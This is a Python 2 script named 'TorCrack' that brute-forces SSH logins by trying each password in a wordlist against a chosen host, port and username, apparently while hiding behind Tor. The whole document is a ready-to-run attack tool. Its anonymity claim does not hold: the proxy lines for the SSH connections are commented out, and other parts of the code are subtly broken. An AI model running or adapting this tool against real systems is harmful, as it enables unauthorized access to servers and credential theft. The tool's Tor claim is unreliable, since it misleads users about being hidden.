#!/usr/bin/python

#norksec torcrack - (c) 2016 no rights reserved

from tqdm import *
from pyfiglet import Figlet
import urllib2
import optparse
import requesocks
import os
import sys
import paramiko
import socket
import atexit
import requests
import socks


def cls():
	os.system('cls' if os.name=='nt' else 'clear')

def intro():
	fa = Figlet(font='graffiti')
	print fa.renderText('NoRKSEC')
	print 'TorCrack v1.0 - (c) 2016 NoRKSEC - no rights reserved\n\n'

def exit_handler():
	print '\n [~] Exiting...\n'

def ssh_connect(password, code = 0):
	paramiko.util.log_to_file("filename.log")
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(tgtHost, port=tgtPort, username=tgtUser, password=password)
	except paramiko.AuthenticationException:
		code = 1
	except socket.error, e:
		code = 2

	ssh.close()
	return code

def is_valid_ipv4(address):
	try:
		socket.inet_pton(socket.AF_INET, address)
	except AttributeError:
		try:
			socket.inet_aton(address)
		except socket.error:
			return False
		return address.count('.') == 3
	except socket.error:
		return False
	return True

def main():
	atexit.register(exit_handler)
	parser = optparse.OptionParser('%prog -p <Tor port> -t <target> -u <username> -d <dictionary/pass list>')
	parser.add_option('-p', dest='torPort', type='int', help='specify Tor port (optional: default 9050)')
	parser.add_option('-t', dest='tgtHost', type='string', help='specify target (required)')
	parser.add_option('-u', dest='tgtUser', type='string', help='specify username (required')
	parser.add_option('-d', dest='dictFile', type='string', help='specify dictionary file/password list (required)')
	parser.add_option('-P', dest='tgtPort', type='int', help="specify target port (required)")
	(options, args) = parser.parse_args()
	global tgtHost, tgtUser, dictFile, tgtPort, torPort
	if (options.tgtHost == None) | (options.tgtUser == None) | (options.dictFile == None) | (options.tgtPort == None):
		print parser.error('Invalid Arguments.')
		exit(0)
	else:
		tgtUser = options.tgtUser
		dictFile = options.dictFile
		tgtPort = options.tgtPort
		if is_valid_ipv4(options.tgtHost) == True:
			tgtHost = options.tgtHost
		else:
			try:
				tgtHost = gethostbyname(options.tgtHost)
			except:
				print " [-] Cannot resolve '%s': Unknown host" % options.tgtHost
				exit(0)
	if (options.torPort == None):
		torPort = 9050
	else:
		torPort = options.torPort
	print '\n [+] ' + options.tgtHost + ' resolved to ' + str(tgtHost)
	print ' [+] Target locked: ' + str(tgtHost) + ':' + str(tgtPort)
	print ' [+] Tor Port set to: ' + str(torPort)
	print ' [+] Target username set to: ' + tgtUser
	
	if not os.path.isfile(dictFile):
		print " [-] Dictionary file does not exist."
		os._exit(1)
	
	print ' [+] Dictionary File/Password List set to: ' + dictFile
	lineMax = sum(1 for line in open(dictFile))
	global session
	session = requesocks.session()
	httpProxy = "socks5://127.0.0.1:" + str(torPort)
	socksProxy = "127.0.0.1"
	session.proxies = {'http': httpProxy, 'https': httpProxy}
	#socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, socksProxy, torPort)	
	#paramiko.client.socket.socket = socks.socksocket
	try:
		test = session.get('http://icanhazip.com').content
	except:
		print ' [-] Error establishing Tor circuit. Is the port correct? Shutting down...\n'
		exit(0)
	print ' [+] Tor circuit established.\n' 
	print ' [+] Tor IP: ' + session.get('http://icanhazip.com').content
	print ' [+] Actual IP: ' + requests.get('http://icanhazip.com').content
	
	input_file = open(dictFile)
	
	for i in tqdm(input_file.readlines(), total=lineMax):
		password = i.strip('\n')
		try:
			response = ssh_connect(password)
			
			if response == 0:
				print 'Code: ' + str(response)
				print ' [*] User: %s [*] Pass Found: %s' % tgtUser, password
				os._exit(1)
			elif response == 1:
				print 'Code: ' + str(response)
				pass
			elif response == 2:
				print 'Code: ' + str(response)
				print ' [-] Connection Could Not Be Established To Address: ' + str(tgtHost) + ':' + str(tgtPort)
				os._exit(1)
		except Exception, e:
			print 'Code: error'
			print e
			pass

	print ' [+] Password not found; Shutting down.'
	
if __name__ == '__main__':
	cls()
	intro()
	main()
